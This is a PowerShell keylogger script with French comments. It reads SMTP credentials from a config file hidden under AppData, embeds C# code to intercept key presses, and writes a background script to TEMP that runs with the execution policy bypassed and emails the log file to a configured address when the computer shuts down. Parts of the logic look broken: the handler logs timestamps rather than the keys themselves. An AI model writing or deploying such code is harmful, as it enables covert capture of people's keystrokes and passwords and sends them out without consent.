# Chemin d'accès au fichier de configuration
$configPath = "$env:APPDATA\Roaming\Microsoft\Internet Explorer\UserData\Low\config.json"

# Vérification de l'existence du fichier de configuration
if (-not (Test-Path -Path $configPath)) {
    Write-Host "Le fichier de configuration n'a pas été trouvé."
    Exit
}

# Chargement du contenu du fichier de configuration JSON
$configContent = Get-Content -Path $configPath -Raw | ConvertFrom-Json

# Récupération des informations de configuration
$adresse_email = $configContent.adresse_email
$objet_email = $configContent.objet_email
$fichier_log = $configContent.fichier_log
$corps_email = $configContent.corps_email
$expediteur_email = $configContent.expediteur_email
$smtp_server = $configContent.smtp_server
$smtp_port = $configContent.smtp_port
$smtp_username = $configContent.smtp_username
$smtp_password = $configContent.smtp_password

Add-Type -TypeDefinition @"
    using System;
    using System.Windows.Forms;

    public class KeyboardInterceptor : NativeWindow
    {
        private const int WM_KEYDOWN = 0x0100;

        public event KeyEventHandler KeyDown;

        public KeyboardInterceptor()
        {
            CreateHandle(new CreateParams());
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_KEYDOWN)
            {
                Keys key = (Keys)m.WParam;
                KeyEventArgs args = new KeyEventArgs(key);
                KeyDown?.Invoke(this, args);
            }

            base.WndProc(ref m);
        }
    }
"@

$interceptor = New-Object KeyboardInterceptor
$interceptor.KeyDown += {
    $key = $_.KeyCode
    Write-Host "Touche enfoncée : $key"
    Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -Append -FilePath $fichier_log -Encoding ASCII
    Add-Content -Path $fichier_log -Value ""
}

# Création du script PowerShell pour surveiller l'événement de fermeture de la fenêtre
$script_ps1 = @"
Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
    Write-Host "Arrêt de l'ordinateur détecté"
    # Envoi de l'e-mail avec le fichier de log en pièce jointe
    Send-MailMessage -To $adresse_email -From $expediteur_email -Subject $objet_email -Body $corps_email -SmtpServer $smtp_server -Port $smtp_port -UseSsl -Credential (New-Object System.Management.Automation.PSCredential($smtp_username, (ConvertTo-SecureString -String $smtp_password -AsPlainText -Force))) -Attachments $fichier_log
    Exit-PSSession
}
"@

# Enregistrement du script dans un fichier temporaire
$scriptPath = Join-Path -Path $env:TEMP -ChildPath "monitor_shutdown.ps1"
$script_ps1 | Out-File -FilePath $scriptPath -Encoding ASCII

# Exécution du script en arrière-plan
$job = Start-Job -ScriptBlock {
    param($scriptPath)
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File $scriptPath
} -ArgumentList $scriptPath

# Boucle principale pour enregistrer les touches entrées jusqu'à l'arrêt de l'ordinateur
while (-not $job.HasMoreData) {
    Start-Sleep -Milliseconds 100
}

# Attente de la fin du script en arrière-plan
Wait-Job -Job $job | Out-Null

# Nettoyage du script temporaire
Remove-Item -Path $scriptPath -Force
